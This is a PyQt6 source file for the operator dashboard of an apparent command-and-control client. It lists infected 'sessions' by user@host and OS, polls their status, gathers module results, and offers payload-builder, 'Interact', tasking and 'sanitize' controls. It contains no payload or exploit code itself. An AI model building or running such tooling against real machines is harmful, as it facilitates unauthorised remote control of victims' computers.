# C2_Client/ui/dashboard_window.py
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QSplitter, QTableWidget, QVBoxLayout, 
                             QLabel, QHeaderView, QTableWidgetItem, QPushButton, QMessageBox)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from ui.builder_pane import BuilderPane
from ui.options_pane import OptionsPane

class DashboardWindow(QWidget):
    build_requested = pyqtSignal(dict)
    sign_out_requested = pyqtSignal()
    setting_changed = pyqtSignal(str, object)
    session_interact_requested = pyqtSignal(str, dict, str)
    data_updated_for_session = pyqtSignal(str, str, dict)

    def __init__(self, api_client, db_manager, username):
        super().__init__()
        self.api = api_client
        self.db = db_manager
        self.username = username
        self.sessions = {}
        main_layout = QHBoxLayout(self)
        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(self.splitter)
        self.builder_pane = BuilderPane(self.db)
        self.builder_pane.build_requested.connect(self.build_requested)
        sessions_pane = QWidget()
        sessions_layout = QVBoxLayout(sessions_pane)
        sessions_layout.setContentsMargins(10,10,10,10)
        sessions_header_layout = QHBoxLayout()
        sessions_header_layout.addWidget(QLabel("<h2>SESSIONS</h2>"))
        sessions_header_layout.addStretch()
        self.refresh_button = QPushButton("Refresh All")
        self.refresh_button.setFixedWidth(100)
        self.refresh_button.clicked.connect(self.refresh_all_data)
        sessions_header_layout.addWidget(self.refresh_button)
        sessions_layout.addLayout(sessions_header_layout)
        self.session_table = QTableWidget()
        self.session_table.setColumnCount(5)
        self.session_table.setHorizontalHeaderLabels(["Status", "User@Host", "Operating System", "Session ID", "Open"])
        self.session_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.session_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        header = self.session_table.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Fixed)
        header.resizeSection(0, 120)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Fixed)
        header.resizeSection(4, 120)
        self.session_table.verticalHeader().setVisible(False)
        self.session_table.setSortingEnabled(True)
        sessions_layout.addWidget(self.session_table)
        self.options_pane = OptionsPane(self.db)
        self.options_pane.sign_out_requested.connect(self.sign_out_requested)
        self.options_pane.setting_changed.connect(self.setting_changed)
        self.options_pane.panel_reset_requested.connect(self.reset_panel_sizes)
        self.options_pane.sanitize_requested.connect(self.handle_sanitize_request)
        self.options_pane.delete_account_requested.connect(self.handle_delete_account_request) # Connect the new signal
        self.splitter.addWidget(self.builder_pane)
        self.splitter.addWidget(sessions_pane)
        self.splitter.addWidget(self.options_pane)
        self.splitter.setSizes([300, 800, 300])
        self.builder_pane.setMinimumWidth(250)
        sessions_pane.setMinimumWidth(500)
        self.options_pane.setMinimumWidth(250)
        self.splitter.setCollapsible(0, False)
        self.splitter.setCollapsible(1, False)
        self.splitter.setCollapsible(2, False)
        self.status_poll_timer = QTimer(self)
        self.status_poll_timer.timeout.connect(self.poll_for_status_and_responses)
        self.full_refresh_timer = QTimer(self)
        self.full_refresh_timer.timeout.connect(self.refresh_all_data)
        self.start_polling()

    def handle_sanitize_request(self):
        response = self.api.sanitize_data(self.username)
        if response and response.get("success"):
            QMessageBox.information(self, "Success", "Sanitize command sent. Refreshing session list.")
            self.refresh_all_data()
        else:
            QMessageBox.critical(self, "Error", "Failed to send sanitize command to the server.")

    def handle_delete_account_request(self):
        """Handles the logic for the Delete Account button."""
        response = self.api.delete_account(self.username)
        if response and response.get("success"):
            QMessageBox.information(self, "Account Deleted", "Your account has been successfully deleted. You will now be logged out.")
            self.sign_out_requested.emit() # Trigger the sign-out process
        else:
            error = response.get("error", "Failed to send delete account command to the server.")
            QMessageBox.critical(self, "Error", error)

    def start_polling(self):
        self.refresh_all_data()
        self.status_poll_timer.start(5000)

    def refresh_all_data(self):
        response = self.api.get_all_vault_data(self.username)
        if response and response.get("success"):
            new_session_data = response.get("data", {})
            for sid, sdata in self.sessions.items():
                if sid in new_session_data and 'status' in sdata:
                    new_session_data[sid]['status'] = sdata['status']
            self.sessions = new_session_data
            self.update_session_table()
            self.poll_for_status_and_responses()
    
    def poll_for_status_and_responses(self):
        live_response = self.api.discover_sessions(self.username)
        live_sids = set(live_response.get('sessions', {}).keys()) if live_response else set()
        needs_ui_update = False
        for sid, sdata in self.sessions.items():
            current_status = sdata.get('status', 'Offline')
            new_status = 'Online' if sid in live_sids else 'Offline'
            if current_status != new_status:
                self.sessions[sid]['status'] = new_status
                needs_ui_update = True
        if needs_ui_update:
            self.update_session_table()
        for session_id in live_sids:
            response_data = self.api.get_responses(self.username, session_id)
            if response_data and response_data.get("responses"):
                for res in response_data["responses"]:
                    module_name = res.get("command")
                    if module_name and session_id in self.sessions:
                        self.sessions[session_id][module_name] = res
                        self.data_updated_for_session.emit(session_id, module_name, res)
                self.update_session_table()

    def update_session_table(self):
        self.session_table.setSortingEnabled(False)
        self.session_table.setRowCount(0)
        sorted_sessions = sorted(self.sessions.items(), key=lambda item: (item[1].get('status', 'Offline') != 'Online', item[0]))
        for row, (session_id, data) in enumerate(sorted_sessions):
            self.session_table.insertRow(row)
            self.session_table.setRowHeight(row, 55)
            status = data.get('status', 'Offline')
            status_button = QPushButton(status.upper())
            status_button.setObjectName("StatusButton")
            status_button.setProperty("status", "online" if status == "Online" else "offline")
            status_button.setEnabled(False)
            container = QWidget()
            layout = QHBoxLayout(container)
            layout.addWidget(status_button)
            layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout.setContentsMargins(5,5,5,5)
            self.session_table.setCellWidget(row, 0, container)
            metadata = data.get('metadata', {})
            user_host_item = QTableWidgetItem(f"{metadata.get('user', 'N/A')}@{metadata.get('hostname', 'N/A')}")
            os_item = QTableWidgetItem(metadata.get('os', 'Unknown'))
            session_id_item = QTableWidgetItem(session_id)
            for item in [user_host_item, os_item, session_id_item]:
                item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.session_table.setItem(row, 1, user_host_item)
            self.session_table.setItem(row, 2, os_item)
            self.session_table.setItem(row, 3, session_id_item)
            interact_button = QPushButton("Interact")
            interact_button.setObjectName("InteractButton")
            interact_button.clicked.connect(lambda chk, sid=session_id, sdata=data: self.session_interact_requested.emit(sid, sdata, sdata.get('status', 'Offline')))
            self.session_table.setCellWidget(row, 4, interact_button)
        self.session_table.setSortingEnabled(True)

    def stop_polling(self):
        self.status_poll_timer.stop()
        self.full_refresh_timer.stop()

    def reset_panel_sizes(self):
        self.splitter.setSizes([300, 800, 300])

    def send_task_from_session(self, sid, task):
        self.api.send_task(self.username, sid, task)